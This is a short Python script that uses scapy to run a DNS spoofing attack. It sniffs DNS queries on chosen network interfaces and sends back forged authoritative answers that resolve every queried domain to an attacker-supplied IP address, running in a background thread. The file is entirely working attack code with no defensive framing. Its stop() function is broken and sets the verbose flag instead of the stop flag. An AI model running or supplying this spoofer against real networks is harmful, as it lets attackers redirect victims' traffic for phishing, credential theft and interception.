from threading import Thread
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP

config = {
    "STOP_SNIFFING": False,
    "VERBOSE": False,
}


def vprint(msg):
    """Verbose print"""
    if config["VERBOSE"]:
        print(msg)


def stop_sniff(pkt):
    return config["STOP_SNIFFING"]


def sniffer(fakeip, interfaces):
    """Continous sniff on specified interfaces and sends fakeip to false response"""
    sniff(prn=lambda pkt: craft_false_response(pkt, fakeip, interfaces),
          lfilter=lambda pkt: pkt.haslayer(DNSQR),
          iface=interfaces,
          stop_filter=stop_sniff)


def craft_false_response(pkt, fakeip, interfaces):
    if pkt[DNS].qr == 0 and pkt[DNS].opcode == 0:  # It's a DNS request
        domain = pkt[DNS].qd.qname.decode()
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        dns = DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=600, rdata=fakeip)
        )
        response = ip / udp / dns
        sendp(response, verbose=False, iface=pkt.sniffed_on)
        vprint(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")


def start(fakeip, interfaces, verbose=False):
    config["VERBOSE"] = verbose
    dns_thread = Thread(target=sniffer, args=(fakeip, interfaces,))
    dns_thread.daemon = True
    dns_thread.start()


def stop():
    config["VERBOSE"] = True
